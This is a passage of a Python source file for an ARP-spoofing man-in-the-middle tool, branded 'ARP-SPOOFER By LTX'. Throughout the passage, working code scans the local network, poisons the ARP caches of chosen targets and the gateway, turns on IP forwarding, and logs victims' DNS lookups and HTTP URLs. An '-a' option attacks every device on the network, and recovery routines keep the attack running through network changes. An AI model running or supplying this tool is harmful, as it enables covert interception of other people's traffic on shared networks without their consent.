                        open_network="ouvert" in current_auth.lower()
                        or "open" in current_auth.lower(),
                    )
                )
        return networks


def get_arguments():
    parser = argparse.ArgumentParser(
        description=f"{Fore.LIGHTMAGENTA_EX}ARP-SPOOFER By LTX: Professional MITM Framework.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.LIGHTCYAN_EX}EXAMPLES:
  {Fore.WHITE}python arp_spoofer.py --scan
  {Fore.WHITE}python arp_spoofer.py --scan -o devices.json
  {Fore.WHITE}python arp_spoofer.py --scan-wifi
  {Fore.WHITE}python arp_spoofer.py -a -s
  {Fore.WHITE}python arp_spoofer.py -r 192.168.1.0/24 -g 192.168.1.1 -a -s

{Fore.LIGHTMAGENTA_EX}NOTES:
  - Use --scan to list devices on the current network and exit.
  - Use --scan-wifi to list available WiFi networks and exit.
  - Use -o/--output to export scan results (.json or .csv).
  - Use -a to attack everyone on the network automatically.
  - Use -s to enable the live DNS/HTTP traffic sniffer.
  - Auto-detects gateway/range if -r/-g omitted (Windows).
  - Auto-recovery: DHCP, IP change, MAC rotate, WiFi reconnect, captive portal.
        """,
    )
    parser.add_argument(
        "--scan",
        action="store_true",
        help="Scan devices on the network and exit (standalone mode)",
    )
    parser.add_argument(
        "--scan-wifi",
        action="store_true",
        help="Scan available WiFi networks and exit (Windows)",
    )
    parser.add_argument(
        "-o", "--output",
        dest="output",
        help="Export scan results to file (.json or .csv)",
    )
    parser.add_argument(
        "--log",
        dest="log_file",
        help="Write session events to a log file",
    )
    parser.add_argument(
        "-r", "--range", dest="ip_range", help="Network range (e.g. 192.168.1.0/24)"
    )
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
    parser.add_argument(
        "-a", "--all", action="store_true", help="Auto-target everyone (silent scan)"
    )
    parser.add_argument(
        "-s", "--sniff", action="store_true", help="Enable live traffic sniffing (DNS/HTTP)"
    )
    parser.add_argument(
        "--no-recovery",
        action="store_true",
        help="Disable automatic internet/WiFi recovery",
    )
    return parser.parse_args()


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None


def silent_scan(ip_range):
    answered_list = scapy.srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
        timeout=2,
        verbose=False,
    )[0]
    return [
        {"ip": element[1].psrc, "mac": element[1].hwsrc} for element in answered_list
    ]


def visual_scan(ip_range):
    print(f"{Fore.BLUE}[*] Initializing Network Scan on {ip_range}...")
    answered_list = scapy.srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
        timeout=3,
        verbose=False,
    )[0]
    clients = []

    print(f"\n{Fore.WHITE}┌{'─' * 17}┬{'─' * 22}┬{'─' * 25}┐")
    print(f"{Fore.WHITE}│ {'IP Address':<15} │ {'MAC Address':<20} │ {'Device Name':<23} │")
    print(f"{Fore.WHITE}├{'─' * 17}┼{'─' * 22}┼{'─' * 25}┤")

    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        try:
            name = socket.gethostbyaddr(ip)[0][:23]
        except Exception:
            name = "Unknown Device"
        clients.append({"ip": ip, "mac": mac, "name": name})
        print(
            f"{Fore.WHITE}│ {Fore.GREEN}{ip:<15} {Fore.WHITE}│ "
            f"{Fore.LIGHTBLACK_EX}{mac:<20} {Fore.WHITE}│ "
            f"{Fore.MAGENTA}{name:<23} {Fore.WHITE}│"
        )

    print(f"{Fore.WHITE}└{'─' * 17}┴{'─' * 22}┴{'─' * 25}┘")
    print(f"\n{Fore.GREEN}[+] Found {len(clients)} device(s).")
    return clients


def enable_ip_forwarding():
    if os.name == "nt":
        run_cmd("netsh interface ipv4 set global forwarding=enabled")
    else:
        run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")


def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
    )
    scapy.sendp(packet, verbose=False)


def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.sendp(packet, count=4, verbose=False)


def process_packet(packet):
    if packet.haslayer(scapy.DNSQR):
        url = packet[scapy.DNSQR].qname.decode()
        print(f"\n{Fore.LIGHTMAGENTA_EX}[DNS LOG] {Fore.WHITE}{url.strip('.')}")
    if packet.haslayer(http.HTTPRequest):
        url = (
            packet[http.HTTPRequest].Host.decode()
            + packet[http.HTTPRequest].Path.decode()
        )
        print(f"\n{Fore.GREEN}[WEB LOG] {Fore.WHITE}{url}")


class SpoofSession:
    def __init__(self, args, resilience: NetworkResilience):
        self.args = args
        self.resilience = resilience
        self.targets: list[dict] = []
        self.gateway_mac: Optional[str] = None
        self.gateway = args.gateway
        self.ip_range = args.ip_range
        self._stop = threading.Event()
        self._targets_lock = threading.Lock()
        self.sent = 0
        self.last_target_refresh = 0.0
        self.last_mac_refresh = 0.0
        self.consecutive_gateway_failures = 0
        self.start_time = time.time()
        self._target_failures: dict[str, int] = {}

    def setup_targets(self):
        if self.args.all:
            log_info("Auto-Attack Mode: Scanning network silently...")
            devices = silent_scan(self.ip_range)
            with self._targets_lock:
                self.targets = [
                    {"ip": d["ip"], "mac": d["mac"]}
                    for d in devices
                    if d["ip"] != self.gateway
                ]
        else:
            devices = visual_scan(self.ip_range)
            if not devices:
                log_err("No devices found.")
                return False
            choice = input(f"\n{Fore.WHITE}[?] Select Target IP: ")
            mac = next((d["mac"] for d in devices if d["ip"] == choice), None)
            if mac:
                with self._targets_lock:
                    self.targets = [{"ip": choice, "mac": mac}]
            else:
                log_err("Target not in list.")
                return False
        log_ok(f"{len(self.targets)} target(s) loaded.")
        return bool(self.targets)

    def refresh_target_macs(self):
        now = time.time()
        if now - self.last_mac_refresh < TARGET_MAC_REFRESH_INTERVAL:
            return
        self.last_mac_refresh = now
        with self._targets_lock:
            for t in self.targets:
                new_mac = get_mac(t["ip"])
                if new_mac and new_mac != t["mac"]:
                    log_info(f"MAC updated for {t['ip']}: {t['mac']} -> {new_mac}")
                    t["mac"] = new_mac

    def refresh_targets_if_needed(self):
        if not self.args.all:
            return
        now = time.time()
        if now - self.last_target_refresh < TARGET_REFRESH_INTERVAL:
            return
        self.last_target_refresh = now
        log_info("Refreshing target list...")
        devices = silent_scan(self.ip_range)
        new_targets = [d for d in devices if d["ip"] != self.gateway]
        with self._targets_lock:
            known_ips = {t["ip"] for t in self.targets}
            for t in new_targets:
                if t["ip"] not in known_ips:
                    self.targets.append({"ip": t["ip"], "mac": t["mac"]})
                    log_ok(f"New target detected: {t['ip']} ({t['mac']})")

    def verify_gateway(self) -> bool:
        mac = get_mac(self.gateway)
        if mac:
            self.gateway_mac = mac
            self.consecutive_gateway_failures = 0
            return True
        self.consecutive_gateway_failures += 1
        return False

    def spoof_cycle(self):
        with self._targets_lock:
            current_targets = list(self.targets)
        if not self.gateway_mac or not current_targets:
            return
        for t in current_targets:
            if not t.get("mac"):
                t["mac"] = get_mac(t["ip"])
                if not t["mac"]:
                    continue
            try:
                spoof(t["ip"], t["mac"], self.gateway)
                spoof(self.gateway, self.gateway_mac, t["ip"])
                self.sent += 2
                self._target_failures[t["ip"]] = 0
            except Exception:
                self._target_failures[t["ip"]] = self._target_failures.get(t["ip"], 0) + 1
                if self._target_failures[t["ip"]] >= 5:
                    new_mac = get_mac(t["ip"])
                    if new_mac:
                        t["mac"] = new_mac
                        self._target_failures[t["ip"]] = 0
                continue

    def watchdog_loop(self):
        while not self._stop.is_set():
            time.sleep(CHECK_INTERVAL)
            try:
                ctx = self.resilience.refresh_context()
                if ctx.gateway and ctx.gateway != self.gateway:
                    log_warn(f"Gateway changed: {self.gateway} -> {ctx.gateway}")
                    self.gateway = ctx.gateway
                if ctx.ip_range and ctx.ip_range != self.ip_range:
                    self.ip_range = ctx.ip_range

                if not self.verify_gateway():
                    log_warn("Gateway unreachable — attempting network recovery...")
                    if not self.args.no_recovery:
                        self.resilience.recover_connectivity()
                        ctx = self.resilience.refresh_context()
                        if ctx.gateway:
                            self.gateway = ctx.gateway
                        if ctx.ip_range:
                            self.ip_range = ctx.ip_range
                        self.verify_gateway()
                    if self.consecutive_gateway_failures >= 3:
                        log_err("Gateway still unreachable after recovery attempts.")

                if not self.args.no_recovery and not self.resilience.has_internet():
                    log_warn("No internet access detected.")
                    self.resilience.recover_connectivity()

                self.refresh_targets_if_needed()
                self.refresh_target_macs()
            except Exception as exc:
                log_warn(f"Watchdog error: {exc}")

    def run(self):
        if not self.verify_gateway():
            log_err("Could not find Gateway MAC address.")
            if not self.args.no_recovery:
                log_info("Attempting initial network recovery...")
                self.resilience.recover_connectivity()
                ctx = self.resilience.refresh_context()
                if ctx.gateway:
                    self.gateway = ctx.gateway
                if ctx.ip_range:
                    self.ip_range = ctx.ip_range
                if not self.verify_gateway():
                    return
            else:
                return

        if self.args.sniff:
            log_info("Traffic Sniffer: Online")
            sniff_thread = threading.Thread(
                target=lambda: scapy.sniff(prn=process_packet, store=False),
                daemon=True,
            )
            sniff_thread.start()
        else:
            log_warn("Traffic Sniffer: Offline (Use -s to enable)")

        watchdog = threading.Thread(target=self.watchdog_loop, daemon=True)
        watchdog.start()

        print(f"\n{Fore.RED}[⚡] BY LTX - ATTACK ACTIVE")
        try:
            while True:
                self.spoof_cycle()
                status = "ONLINE" if self.resilience.has_internet() else "OFFLINE"
                with self._targets_lock:
                    target_count = len(self.targets)
                uptime = int(time.time() - self.start_time)
                hours, rem = divmod(uptime, 3600)
                mins, secs = divmod(rem, 60)
                uptime_str = f"{hours:02d}:{mins:02d}:{secs:02d}"
                print(
                    f"\r{Fore.WHITE}Packets: {Fore.GREEN}{self.sent} "
                    f"{Fore.WHITE}| Targets: {Fore.GREEN}{target_count} "
                    f"{Fore.WHITE}| Internet: {Fore.GREEN if status == 'ONLINE' else Fore.RED}{status} "
                    f"{Fore.WHITE}| Uptime: {Fore.CYAN}{uptime_str} "
                    f"{Fore.WHITE}| Ctrl+C to stop",
                    end="",
                )
                time.sleep(SPOOF_INTERVAL)
        except KeyboardInterrupt:
            self._stop.set()
            self._restore()

    def _restore(self):
        print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Restoring network state... Please wait.")
        with self._targets_lock:
            current_targets = list(self.targets)
        try:
            if self.gateway_mac:
                for t in current_targets:
                    restore(t["ip"], t["mac"], self.gateway, self.gateway_mac)
                    restore(self.gateway, self.gateway_mac, t["ip"], t["mac"])
            log_ok("Network successfully restored. Exit.")
        except Exception:
            log_err("Error during restoration.")


def resolve_network_args(args) -> tuple[str, str]:
    resilience = NetworkResilience(NetworkContext())
    resilience.capture_initial_wifi()
    ip, gateway, ip_range = resilience._detect_network()

    if not args.ip_range:
        args.ip_range = ip_range
    if not args.gateway:
        args.gateway = gateway

    if not args.ip_range or not args.gateway:
        log_err("Could not auto-detect network. Provide -r and -g manually.")
        sys.exit(1)

    if args.ip_range == "UNKNOWN" or not re.match(r"\d+\.\d+\.\d+\.\d+", args.gateway):
        log_err("Invalid network configuration detected.")
        sys.exit(1)

    return args.ip_range, args.gateway


def run_scan_mode(args):
    ip_range, _ = resolve_network_args(args)
    print_banner()
    log_info(f"Standalone scan mode — range: {ip_range}")
    devices = visual_scan(ip_range)
    if args.output and devices:
        export_scan_results(devices, args.output)
    sys.exit(0)


def run_wifi_scan_mode(args):
    print_banner()
    if os.name != "nt":
        log_err("WiFi scan is only supported on Windows.")
        sys.exit(1)
    resilience = NetworkResilience(NetworkContext())
    resilience.capture_initial_wifi()
    log_info("Scanning WiFi networks...")
    resilience.display_wifi_scan()
    sys.exit(0)


def init_session_logger(log_file: Optional[str]):
    global _session_logger
    _session_logger = SessionLogger(log_file)
    atexit.register(lambda: _session_logger.write("INFO", "Session ended") if _session_logger else None)


def main():
    args = get_arguments()

    if args.scan:
        run_scan_mode(args)
    if args.scan_wifi:
        run_wifi_scan_mode(args)

    print_banner()

    if os.name == "nt" and not check_admin_windows():
        log_warn("Not running as Administrator — ARP spoofing and recovery may fail.")
        log_warn("Right-click CMD/PowerShell -> Run as administrator.")

    init_session_logger(args.log_file)

    args.ip_range, args.gateway = resolve_network_args(args)
    log_info(f"Network: {args.ip_range} | Gateway: {args.gateway}")

    enable_ip_forwarding()

    initial_ctx = NetworkContext(ip_range=args.ip_range, gateway=args.gateway)
    resilience = NetworkResilience(initial_ctx)
    resilience.capture_initial_wifi()
    resilience.refresh_context()

    if not args.no_recovery and not resilience.has_internet():
        log_warn("No internet at startup — running recovery...")
        resilience.recover_connectivity()
        ctx = resilience.refresh_context()
        if ctx.ip_range:
            args.ip_range = ctx.ip_range
        if ctx.gateway:
            args.gateway = ctx.gateway

    session = SpoofSession(args, resilience)
    if not session.setup_targets():
        sys.exit(1)
    session.run()
    sys.exit(0)


if __name__ == "__main__":
    main()

# Made by LTX74
